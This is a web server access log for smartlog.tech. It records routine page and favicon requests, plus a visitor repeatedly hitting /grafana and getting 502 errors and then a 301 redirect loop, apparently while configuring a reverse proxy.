193.142.132.33 - - [28/May/2025:12:07:37 +0000] "GET /favicon.ico HTTP/1.1" 404 207 "https://www.smartlog.tech/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/116.0.5845.177 Mobile/15E148 Safari/604.1"
45.148.106.119 - - [28/May/2025:12:07:39 +0000] "GET / HTTP/1.1" 200 47 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/116.0.5845.177 Mobile/15E148 Safari/604.1"
45.148.106.119 - - [28/May/2025:12:07:39 +0000] "GET /favicon.ico HTTP/1.1" 404 207 "https://smartlog.tech/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/116.0.5845.177 Mobile/15E148 Safari/604.1"
20.2.249.66 - - [28/May/2025:12:07:39 +0000] "GET / HTTP/1.1" 200 47 "-" "curl/8.5.0"
141.98.11.27 - - [28/May/2025:12:14:22 +0000] "GET / HTTP/1.1" 301 169 "-" "-"
122.173.31.207 - - [28/May/2025:12:17:23 +0000] "GET / HTTP/1.1" 200 47 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0"
122.173.31.207 - - [28/May/2025:12:18:24 +0000] "GET /grafana HTTP/1.1" 301 169 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0"
122.173.31.207 - - [28/May/2025:12:18:25 +0000] "GET /grafana/ HTTP/1.1" 502 157 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0"
144.217.86.46 - - [28/May/2025:12:18:38 +0000] "GET / HTTP/1.1" 200 47 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
122.173.31.207 - - [28/May/2025:12:18:40 +0000] "GET /grafana/ HTTP/1.1" 502 157 "https://chatgpt.com/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0"
144.217.86.46 - - [28/May/2025:12:18:48 +0000] "GET / HTTP/1.1" 200 47 "-" "-"
144.217.86.46 - - [28/May/2025:12:18:50 +0000] "GET /favicon.ico HTTP/1.1" 404 207 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
144.217.86.46 - - [28/May/2025:12:18:51 +0000] "HEAD / HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
144.217.86.46 - - [28/May/2025:12:18:51 +0000] "GET / HTTP/1.1" 200 47 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
144.217.86.46 - - [28/May/2025:12:19:30 +0000] "GET / HTTP/1.1" 200 47 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
144.217.86.46 - - [28/May/2025:12:19:58 +0000] "GET / HTTP/1.1" 200 47 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
122.173.31.207 - - [28/May/2025:12:22:15 +0000] "GET /grafana/ HTTP/1.1" 301 64 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0"
122.173.31.207 - - [28/May/2025:12:22:16 +0000] "GET / HTTP/1.1" 200 47 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0"
122.173.31.207 - - [28/May/2025:12:22:16 +0000] "GET /favicon.ico HTTP/1.1" 499 0 "https://www.smartlog.tech/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0"
122.173.31.207 - - [28/May/2025:12:22:21 +0000] "GET /grafana/ HTTP/1.1" 301 169 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0"
122.173.31.207 - - [28/May/2025:12:22:22 +0000] "GET /grafana/ HTTP/1.1" 301 64 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0"
122.173.31.207 - - [28/May/2025:12:22:22 +0000] "GET /grafana/ HTTP/1.1" 301 169 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0"
122.173.31.207 - - [28/May/2025:12:22:22 +0000] "GET /grafana/ HTTP/1.1" 301 64 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0"
122.173.31.207 - - [28/May/2025:12:22:23 +0000] "GET /grafana/ HTTP/1.1" 301 169 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0"
122.173.31.207 - - [28/May/2025:12:22:23 +0000] "GET /grafana/ HTTP/1.1" 301 64 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0"
122.173.31.207 - - [28/May/2025:12:22:23 +0000] "GET /grafana/ HTTP/1.1" 301 169 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0"
122.173.31.207 - - [28/May/2025:12:22:24 +0000] "GET /grafana/ HTTP/1.1" 301 64 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0"
122.173.31.207 - - [28/May/2025:12:22:24 +0000] "GET /grafana/ HTTP/1.1" 301 169 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0"
122.173.31.207 - - [28/May/2025:12:22:24 +0000] "GET /grafana/ HTTP/1.1" 301 64 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0"
